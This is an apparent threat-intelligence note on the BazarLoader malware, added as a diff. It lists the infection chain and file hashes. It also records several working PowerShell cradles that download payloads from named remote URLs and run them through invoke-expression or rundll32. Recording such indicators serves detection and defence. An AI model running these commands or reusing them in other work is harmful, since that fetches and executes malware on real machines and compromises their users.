@@ -1,0 +1,26 @@
+BazarLoader 2022
+
+************************************************************************************************************
+
+.zip > .vbs > .ps1 > .dll
+
+
+.vbs aee7bebdcda363c92fcd012808e98e8da04150163f6f68c54e0b6a0a91342af9
+
+.dll bcea5ce4649fd1d2be35ff3b023a614d48adbd5cd58af149bc24c5c94f005879
+
+invoke-expression (new-object net.webclient).downloadstring("https://designelis.com.br/codecoguard.php")
+
+https://designelis.com.br/codecoguard.php
+
+$path = $Env:temp+'\53497682-.bin'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://bdjessi.bobetbobette.com/loginup.php',$path); C:\Windows\System32\rundll32.exe $path,drusvcw
+
+.dll drop
+
+https://bdjessi.bobetbobette.com/loginup.php?/82_413-9.bin
+
+
+$path = $Env:temp+'\1092657_3.bin'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://bdjessi.bobetbobette.com/loginup.php',$path); C:\Windows\System32\rundll32.exe $path,drusvcw
+$path = $Env:temp+'\-7_901843.bin'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://bdjessi.bobetbobette.com/loginup.php',$path); C:\Windows\System32\rundll32.exe $path,drusvcw
+$path = $Env:temp+'\192840675.bin'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://bdjessi.bobetbobette.com/loginup.php',$path); C:\Windows\System32\rundll32.exe $path,drusvcw
+$path = $Env:temp+'\359-864_2.bin'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://bdjessi.bobetbobette.com/loginup.php',$path); C:\Windows\System32\rundll32.exe $path,drusvcw
